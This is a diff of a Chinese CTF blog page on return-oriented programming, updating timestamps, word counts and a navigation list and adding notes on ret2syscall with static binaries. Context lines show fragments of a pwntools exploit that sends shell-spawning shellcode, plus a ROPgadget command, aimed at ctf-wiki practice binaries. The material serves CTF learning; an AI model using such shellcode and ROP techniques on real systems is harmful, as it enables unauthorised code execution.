@@ -166,7 +166,7 @@
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="3">
-<input type="hidden" id="yelog_site_word_count" value="1.5k">
+<input type="hidden" id="yelog_site_word_count" value="1.6k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -231,20 +231,20 @@
             <span class="post-date" title="2019-11-17 23:46:05">2019/11/17</span>
         </a>
         
-        <a  class="PWN "
-           href="/2019/11/26/ROP-CTFwiki/"
-           data-tag="PWN,ROP"
-           data-author="" >
-            <span class="post-title" title="ROP - CTFwiki">ROP - CTFwiki</span>
-            <span class="post-date" title="2019-11-26 23:21:07">2019/11/26</span>
-        </a>
-        
         <a  class="代码审计 漏洞复现 "
            href="/2019/11/19/phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/"
            data-tag="代码审计,漏洞复现"
            data-author="" >
             <span class="post-title" title="phpmyadmin 4.8.1 远程文件包含漏洞(CVE-2018-12613)">phpmyadmin 4.8.1 远程文件包含漏洞(CVE-2018-12613)</span>
             <span class="post-date" title="2019-11-19 01:33:55">2019/11/19</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019/11/26/ROP-CTFwiki/"
+           data-tag="PWN,ROP"
+           data-author="" >
+            <span class="post-title" title="ROP - CTFwiki">ROP - CTFwiki</span>
+            <span class="post-date" title="2019-11-26 23:21:07">2019/11/26</span>
         </a>
         
     </nav>
@@ -285,12 +285,12 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-11-28 05:50:50'>2019-11-26 23:21</time>
+        创建时间:<time class="date" title='更新时间: 2019-12-06 01:25:29'>2019-11-26 23:21</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:587</span>
+        <span>字数:627</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -393,7 +393,8 @@ shellcode = asm(shellcraft.sh())
 
 p.sendline(shellcode)
 p.interactive()</code></pre>
-<h2 id="ret2syscall（NX-on）"><a href="#ret2syscall（NX-on）" class="headerlink" title="ret2syscall（NX on）"></a>ret2syscall（NX on）</h2><blockquote>
+<h2 id="ret2syscall（NX-on）"><a href="#ret2syscall（NX-on）" class="headerlink" title="ret2syscall（NX on）"></a>ret2syscall（NX on）</h2><p>动态链接是没有 int 0x80 之类的指令的，这里的文件自然也是 static。 </p>
+<blockquote>
 <p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop</a></p>
 </blockquote>
 <p>offset 和前面一样还是 112，不同的是 NX 开启，不能像 ret2shellcode 那样读 shellcode 到一个 buf。这里用 ret2syscall:</p>
@@ -403,6 +404,10 @@ p.interactive()</code></pre>
 <li>ebx 为 ‘/bin/sh’ 字符串的地址</li>
 <li>ecx 和 edx 为0</li>
 </ol>
+<p>关于 linux 系统调用可以参考：</p>
+<blockquote>
+<p><a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">https://syscalls.kernelgrok.com/</a></p>
+</blockquote>
 <p>借助 ROPgadget：</p>
 <pre><code class="bash">ROPgadget --binary ./ret2syscall --only &quot;int&quot;
 
@@ -442,10 +447,10 @@ p.interactive()</code></pre>
 
 <div class="article_copyright">
     <p><span class="copy-title">文章标题:</span>ROP - CTFwiki</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">587</span></p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">627</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="知弦">知弦</a></p>
     <p><span class="copy-title">发布时间:</span>2019-11-26, 23:21:07</p>
-    <p><span class="copy-title">最后更新:</span>2019-11-28, 05:50:50</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-06, 01:25:29</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/26/ROP-CTFwiki/" title="ROP - CTFwiki">http://zh1x1an.com/2019/11/26/ROP-CTFwiki/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
